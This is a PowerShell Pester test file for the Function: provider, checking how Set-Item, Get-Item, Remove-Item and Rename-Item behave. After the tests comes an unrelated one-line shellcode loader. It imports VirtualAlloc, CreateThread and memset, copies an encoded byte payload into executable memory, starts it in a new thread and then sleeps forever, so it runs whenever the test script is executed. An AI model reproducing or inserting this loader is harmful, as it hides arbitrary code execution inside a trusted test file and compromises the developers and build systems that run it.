


Describe "Basic Function Provider Tests" -Tags "CI" {
    BeforeAll {
        $existingFunction = "existingFunction"
        $nonExistingFunction = "nonExistingFunction"
        $text = "Hello World!"
        $functionValue = { return $text }
        $restoreLocation = Get-Location
        $newName = "renamedFunction"
        Set-Location Function:
    }

    AfterAll {
        Set-Location -Path $restoreLocation
    }

    BeforeEach {
        Set-Item $existingFunction -Options "None" -Value $functionValue
    }

    AfterEach {
        Remove-Item $existingFunction -ErrorAction SilentlyContinue -Force
        Remove-Item $nonExistingFunction -ErrorAction SilentlyContinue -Force
        Remove-Item $newName -ErrorAction SilentlyContinue -Force
    }

    Context "Validate Set-Item Cmdlet" {
        It "Sets the new options in existing function" {
            $newOptions = "ReadOnly, AllScope"
            (Get-Item $existingFunction).Options | Should -BeExactly "None"
            Set-Item $existingFunction -Options $newOptions
            (Get-Item $existingFunction).Options | Should -BeExactly $newOptions
        }

        It "Sets the options and a value of type ScriptBlock for a new function" {
            $options = "ReadOnly"
            Set-Item $nonExistingFunction -Options $options -Value $functionValue
            $getItemResult = Get-Item $nonExistingFunction
            $getItemResult.Options | Should -BeExactly $options
            $getItemResult.ScriptBlock | Should -BeExactly $functionValue
        }

        It "Removes existing function if Set-Item has no arguments beside function name" {
            Set-Item $existingFunction
            $existingFunction | Should -Not -Exist
        }

        It "Sets a value of type FunctionInfo for a new function" {
            Set-Item $nonExistingFunction -Value (Get-Item $existingFunction)
            Invoke-Expression $nonExistingFunction | Should -BeExactly $text
        }

        It "Sets a value of type String for a new function" {
            Set-Item $nonExistingFunction -Value "return '$text' "
            Invoke-Expression $nonExistingFunction | Should -BeExactly $text
        }

        It "Throws PSArgumentException when Set-Item is called with incorrect function value" {
            { Set-Item $nonExistingFunction -Value 123 -ErrorAction Stop } | Should -Throw -ErrorId "Argument,Microsoft.PowerShell.Commands.SetItemCommand"
        }
    }

    Context "Validate Get-Item Cmdlet" {
        It "Gets existing functions by name" {
            $getItemResult = Get-Item $existingFunction
            $getItemResult.Name | Should -BeExactly $existingFunction
            $getItemResult.Options | Should -BeExactly "None"
            $getItemResult.ScriptBlock | Should -BeExactly $functionValue
        }

        It "Matches regex with stars to the function names" {
            $getItemResult = Get-Item "ex*on"
            $getItemResult.Name | Should -BeExactly $existingFunction

            
            $getItemResult = Get-Item "*existingFunction*"
            $getItemResult.Name | Should -BeExactly $existingFunction

            
            Set-Item $nonExistingFunction -Value $functionValue
            $getItemResults =  Get-Item "*Function"
            $getItemResults.Count | Should -BeGreaterThan 1
        }
    }

    Context "Validate Remove-Item Cmdlet" {
        It "Removes function" {
            Remove-Item $existingFunction
            { Get-Item $existingFunction -ErrorAction Stop } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand"
        }

        It "Fails to remove not existing function" {
            { Remove-Item $nonExistingFunction -ErrorAction Stop } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.RemoveItemCommand"
        }
    }

    Context "Validate Rename-Item Cmdlet" {
        It "Renames existing function with None options" {
            Rename-Item $existingFunction -NewName $newName
            { Get-Item $existingFunction -ErrorAction Stop } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand"
            (Get-Item $newName).Count | Should -BeExactly 1
        }

        It "Fails to rename not existing function" {
            { Rename-Item $nonExistingFunction -NewName $newName -ErrorAction Stop } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.RenameItemCommand"
        }

        It "Fails to rename function which is Constant" {
            Set-Item $nonExistingFunction -Options "Constant" -Value $functionValue
            { Rename-Item $nonExistingFunction -NewName $newName -ErrorAction Stop } | Should -Throw -ErrorId "CannotRenameFunction,Microsoft.PowerShell.Commands.RenameItemCommand"
        }

        It "Fails to rename function which is ReadOnly" {
            Set-Item $nonExistingFunction -Options "ReadOnly" -Value $functionValue
            { Rename-Item $nonExistingFunction -NewName $newName -ErrorAction Stop } | Should -Throw -ErrorId "CannotRenameFunction,Microsoft.PowerShell.Commands.RenameItemCommand"
        }

        It "Renames ReadOnly function when -Force parameter is on" {
            Set-Item $nonExistingFunction -Options "ReadOnly" -Value $functionValue
            Rename-Item $nonExistingFunction -NewName $newName -Force
            { Get-Item $nonExistingFunction -ErrorAction Stop } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand"
            (Get-Item $newName).Count | Should -BeExactly 1
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xb5,0xae,0xb4,0x6e,0xdb,0xce,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x52,0x31,0x50,0x12,0x03,0x50,0x12,0x83,0x75,0xaa,0x56,0x9b,0x89,0x5b,0x14,0x64,0x71,0x9c,0x79,0xec,0x94,0xad,0xb9,0x8a,0xdd,0x9e,0x09,0xd8,0xb3,0x12,0xe1,0x8c,0x27,0xa0,0x87,0x18,0x48,0x01,0x2d,0x7f,0x67,0x92,0x1e,0x43,0xe6,0x10,0x5d,0x90,0xc8,0x29,0xae,0xe5,0x09,0x6d,0xd3,0x04,0x5b,0x26,0x9f,0xbb,0x4b,0x43,0xd5,0x07,0xe0,0x1f,0xfb,0x0f,0x15,0xd7,0xfa,0x3e,0x88,0x63,0xa5,0xe0,0x2b,0xa7,0xdd,0xa8,0x33,0xa4,0xd8,0x63,0xc8,0x1e,0x96,0x75,0x18,0x6f,0x57,0xd9,0x65,0x5f,0xaa,0x23,0xa2,0x58,0x55,0x56,0xda,0x9a,0xe8,0x61,0x19,0xe0,0x36,0xe7,0xb9,0x42,0xbc,0x5f,0x65,0x72,0x11,0x39,0xee,0x78,0xde,0x4d,0xa8,0x9c,0xe1,0x82,0xc3,0x99,0x6a,0x25,0x03,0x28,0x28,0x02,0x87,0x70,0xea,0x2b,0x9e,0xdc,0x5d,0x53,0xc0,0xbe,0x02,0xf1,0x8b,0x53,0x56,0x88,0xd6,0x3b,0x9b,0xa1,0xe8,0xbb,0xb3,0xb2,0x9b,0x89,0x1c,0x69,0x33,0xa2,0xd5,0xb7,0xc4,0xc5,0xcf,0x00,0x5a,0x38,0xf0,0x70,0x73,0xff,0xa4,0x20,0xeb,0xd6,0xc4,0xaa,0xeb,0xd7,0x10,0x7c,0xbb,0x77,0xcb,0x3d,0x6b,0x38,0xbb,0xd5,0x61,0xb7,0xe4,0xc6,0x8a,0x1d,0x8d,0x6d,0x71,0xf6,0x1e,0x61,0x79,0x04,0x37,0x80,0x79,0x19,0x9b,0x0d,0x9f,0x73,0x33,0x58,0x08,0xec,0xaa,0xc1,0xc2,0x8d,0x33,0xdc,0xaf,0x8e,0xb8,0xd3,0x50,0x40,0x49,0x99,0x42,0x35,0xb9,0xd4,0x38,0x90,0xc6,0xc2,0x54,0x7e,0x54,0x89,0xa4,0x09,0x45,0x06,0xf3,0x5e,0xbb,0x5f,0x91,0x72,0xe2,0xc9,0x87,0x8e,0x72,0x31,0x03,0x55,0x47,0xbc,0x8a,0x18,0xf3,0x9a,0x9c,0xe4,0xfc,0xa6,0xc8,0xb8,0xaa,0x70,0xa6,0x7e,0x05,0x33,0x10,0x29,0xfa,0x9d,0xf4,0xac,0x30,0x1e,0x82,0xb0,0x1c,0xe8,0x6a,0x00,0xc9,0xad,0x95,0xad,0x9d,0x39,0xee,0xd3,0x3d,0xc5,0x25,0x50,0x4d,0x8c,0x67,0xf1,0xc6,0x49,0xf2,0x43,0x8b,0x69,0x29,0x87,0xb2,0xe9,0xdb,0x78,0x41,0xf1,0xae,0x7d,0x0d,0xb5,0x43,0x0c,0x1e,0x50,0x63,0xa3,0x1f,0x71;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

